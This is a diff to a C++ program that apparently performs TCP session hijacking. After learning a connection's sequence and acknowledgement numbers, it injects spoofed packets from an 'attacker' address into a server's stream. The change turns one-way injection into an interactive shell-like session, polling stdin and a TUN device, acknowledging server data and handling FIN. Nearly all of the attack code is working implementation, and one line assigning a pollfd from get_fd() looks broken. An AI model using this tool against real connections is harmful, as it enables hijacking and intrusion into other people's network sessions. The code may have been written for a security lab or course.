@@ -1,11 +1,15 @@
+#include <chrono>
 #include <cstdint>
 #include <iostream>
 #include <limits>
 #include <optional>
 #include <random>
+#include <stdio.h>
+#include <sys/poll.h>
 #include <thread>
 
 #include <poll.h>
+#include <unistd.h>
 
 #include "tcp-interface.hpp"
 #include "tcp-packet.hpp"
@@ -97,36 +101,71 @@ int main(int argc, char **argv) {
     std::cout << "Got seqno: " << true_seqno << ", ackno: " << true_ackno << std::endl;
 
     std::cout << "Enabling netcat..." << std::endl;
-    // Sending to server only for now
-    for (std::string line; std::getline(std::cin, line);) {
-      send_pkt(config, TCPPacket{
-                  .src = attacker_addr,
-                  .dst = config.topology.server_addr,
-                  .seqno = true_seqno,
-                  .ackno = true_ackno,
-                  .psh = true,
-                  .data = line + "\n",
-              });
+    
+    struct pollfd poll_list[2];
+    // First listener: stdin
+    poll_list[0].fd = STDIN_FILENO;
+    poll_list[0].events = POLLIN;
 
-      std::optional<TCPPacket> tcp_response = config.topology.interface.receive(
-      [](const TCPPacket &pkt) -> bool {
-        // No filter
-        return true;
-      },
-      config.timeout);
-      if (tcp_response.has_value()) {
-        // Success case only for now
-        true_seqno = tcp_response->ackno.value();
+    // First listener: TUN device
+    poll_list[1] = config.topology.interface.get_fd();
+
+    while (true) {
+      int res = poll(poll_list, 2, 10);
+      if (res <= 0) {
+        continue;
+      }
+      if (poll_list[0].revents & POLLIN) {
+        char buf[4096];
+        int len = read(STDIN_FILENO, buf, sizeof(buf));
+        std::string data(buf, len);
+        send_pkt(config, TCPPacket{
+            .src = attacker_addr,
+            .dst = config.topology.server_addr,
+            .seqno = true_seqno,
+            .ackno = true_ackno,
+            .psh = true,
+            .data = data,
+        });
+      }
+      if (poll_list[1].revents & POLLIN) {
+        // Check the TUN device immediately for the packet
+        std::optional<TCPPacket> tcp_response = config.topology.interface.receive(
+        [&config](const TCPPacket &pkt) -> bool {
+          // Only packets meant for this port
+          return pkt.dst.port == config.port;
+        }, (std::chrono::milliseconds)5);
+        if (tcp_response.has_value()) {
+          // Update local values
+          true_seqno = tcp_response->ackno.value();
+          true_ackno = tcp_response->seqno;
+
+          // Server terminates connection
+          if (tcp_response->fin) {
+            send_pkt(config, TCPPacket{
+              .src = attacker_addr,
+              .dst = config.topology.server_addr,
+              .seqno = true_seqno,
+              .ackno = true_ackno,
+              .fin = true,
+            });
+            break;
+          }
+
+          // Server sent text
+          if (tcp_response->psh) {
+            std::cout << tcp_response->data;
+            send_pkt(config, TCPPacket{
+              .src = attacker_addr,
+              .dst = config.topology.server_addr,
+              .seqno = true_seqno,
+              .ackno = true_ackno + tcp_response->data.length(),
+            });
+          }
+        }
       }
     }
-    // End stream
-    send_pkt(config, TCPPacket{
-                      .src = attacker_addr,
-                      .dst = config.topology.server_addr,
-                      .seqno = true_seqno,
-                      .ackno = true_ackno,
-                      .fin = true,
-                  });
+
   }
 }
 
